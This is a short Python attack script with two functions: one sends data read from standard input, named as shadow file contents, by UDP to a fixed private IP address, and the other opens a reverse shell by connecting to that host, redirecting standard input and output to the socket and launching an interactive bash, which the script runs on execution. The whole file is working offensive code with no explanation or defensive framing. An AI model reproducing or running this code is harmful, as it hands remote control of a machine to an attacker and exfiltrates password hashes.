import socket, os, sys, subprocess


def send_shadow():
    shadow = (sys.stdin.read()).encode()
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    # print(shadow.read().encode())
    s.sendto(shadow, ('192.168.110.23', 100))
    return 0


def send_shell():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.110.23",100))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p = subprocess.call(["/bin/bash", "-i"])
    # p = subprocess.call(["/bin/sh","-i"])


send_shell()



